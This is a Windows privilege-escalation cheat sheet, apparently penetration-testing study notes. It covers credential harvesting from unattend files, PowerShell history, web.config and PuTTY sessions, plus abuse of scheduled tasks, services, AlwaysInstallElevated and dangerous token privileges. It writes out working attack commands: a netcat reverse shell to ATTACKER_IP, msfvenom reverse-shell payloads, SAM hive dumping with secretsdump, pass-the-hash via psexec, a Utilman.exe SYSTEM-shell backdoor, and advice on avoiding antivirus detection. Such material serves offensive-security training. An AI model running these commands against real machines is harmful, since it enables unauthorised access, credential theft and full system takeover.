# Windows Privilege Escalation Reference

## Built-In Accounts

### SYSTEM / LocalSystem
The SYSTEM account (also known as LocalSystem) is a predefined local account used by the operating system to perform internal system-level tasks. It possesses more privileges than even Administrator accounts and is used to run core Windows services. It has unrestricted access to the local machine, including all files and resources.

### Local Service / Network Service
These accounts are used to run services with limited permissions, providing a minimal set of privileges necessary for service functionality.
- **Local Service** has no network credentials and represents anonymous access to network resources.
- **Network Service** can access network resources as the computer's identity.

## Escalation Techniques

### Harvesting Passwords

#### Unattended Windows Installations
When deploying Windows to multiple machines, administrators often use Windows Deployment Services. This process may leave plaintext credentials on disk for setup automation. Check these locations:
- `C:\Unattend.xml`
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Unattend\Unattend.xml`
- `C:\Windows\system32\sysprep.inf`
- `C:\Windows\system32\sysprep\sysprep.xml`

#### PowerShell History
Users sometimes run sensitive commands directly in PowerShell. These commands are logged in the history file:
```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

#### Saved Windows Credentials
Saved credentials can be enumerated with:
```cmd
cmdkey /list
```
Use them (if applicable) with:
```cmd
runas /savecred /user:admin cmd.exe
```

#### IIS Configuration Files
Passwords might be found in `web.config` files, especially database connection strings. Common paths:
- `C:\inetpub\wwwroot\web.config`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`

Search for connection strings:
```cmd
type web.config | findstr connectionString
```

#### PuTTY Stored Sessions
PuTTY stores session information in the registry, including proxy credentials:
```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

### Quick Wins

#### Scheduled Tasks
Scheduled tasks might run with higher privileges. To investigate:
```cmd
schtasks /query /tn vulntask /fo list /v
```
Check `Task To Run` and `Run As User`. If the executable is writable:
```cmd
icacls c:\tasks\schtask.bat
```
Insert a reverse shell:
```cmd
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```
Start listener:
```bash
nc -lvp 4444
```
Run task manually:
```cmd
schtasks /run /tn vulntask
```

#### AlwaysInstallElevated
Allows .msi files to run with elevated privileges when two registry keys are set:
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
Create malicious MSI:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f msi -o malicious.msi
```
Execute:
```cmd
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

### Abusing Server Misconfigurations

#### Understanding Windows Services
Services run executables under specific user accounts. Check config:
```cmd
sc qc SERVICE_NAME
```
Executable: `BINARY_PATH_NAME`
Account: `SERVICE_START_NAME`

#### Insecure Permissions on Service Executable
If the service executable is writable:
```cmd
icacls C:\PATH\TO\EXECUTABLE.exe
```
Replace it with a malicious executable:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe-service -o rev-svc.exe
```
Transfer and replace the executable, then restart the service:
```cmd
sc stop SERVICE_NAME
sc start SERVICE_NAME
```

#### Unquoted Service Paths
Improperly quoted service paths allow attackers to insert malicious executables in path segments. Check:
```cmd
sc qc SERVICE_NAME
```
Search for writable folders in the path:
```cmd
icacls C:\MyPrograms
```
Place a malicious executable in the appropriate location and restart the service.

#### Insecure Service Permissions
If a service DACL is misconfigured:
```cmd
accesschk64.exe -qlc SERVICE_NAME
```
If `SERVICE_ALL_ACCESS` is granted, reconfigure:
```cmd
sc config SERVICE_NAME binPath= "C:\PATH\TO\SHELL.exe" obj= LocalSystem
```
Restart the service to gain elevated access.

### Abusing Dangerous Privileges

#### SeBackup / SeRestore
Allows bypassing DACLs to read/write files. Use to copy `SAM` and `SYSTEM` registry hives:
```cmd
reg save hklm\system C:\Users\USER\system.hive
reg save hklm\sam C:\Users\USER\sam.hive
```
Use SMB to transfer files and extract hashes:
```bash
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

Use hashes for Pass-the-Hash attacks:
```bash
psexec.py -hashes LMHASH:NTHASH administrator@TARGET
```

#### SeTakeOwnership
Allows taking ownership of any file. Replace `Utilman.exe` with `cmd.exe`:
```cmd
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant USER:F
copy cmd.exe Utilman.exe
```
Lock the screen and click the "Ease of Access" icon for a SYSTEM shell.

#### SeImpersonate / SeAssignPrimaryToken
Allows impersonating other users. Services like IIS or SYSTEM services using LOCAL SERVICE or NETWORK SERVICE can be abused using tools like `RogueWinRM`.

### Abusing Vulnerable Software

#### Unpatched Software
List installed software and versions:
```cmd
wmic product get name,version,vendor
```
Search for exploits on:
- [exploit-db.com](https://www.exploit-db.com/)
- [packetstormsecurity.com](https://packetstormsecurity.com/)

### Tools of the Trade

#### WinPEAS
Comprehensive enumeration script for privilege escalation:
```cmd
winpeas.exe > output.txt
```

#### PrivescCheck
PowerShell script for checking common privilege escalation misconfigurations.

---
### WES-NG: Windows Exploit Suggester - Next Generation
Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali)

WES-NG is a Python script that can be found and downloaded [here](https://github.com/bitsadmin/wesng).

Once installed, and before using it, type the `wes.py --update` command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability.

To use the script, you will need to run the `systeminfo` command on the target system. Do not forget to direct the output to a .txt file

Once this is done, wes.py can be run as follows:
```
wes.py systeminfo.txt
```

### [[Main Components]] AKA Metasploit
If you already have a Meterpreter shell on the target system, you can use the `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.

## Additional Techniques
Should you be interested in learning about additional techniques, the following resources are available:

- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
- [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
- [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
- [Decoder's Blog](https://decoder.cloud/)
- [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
- [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)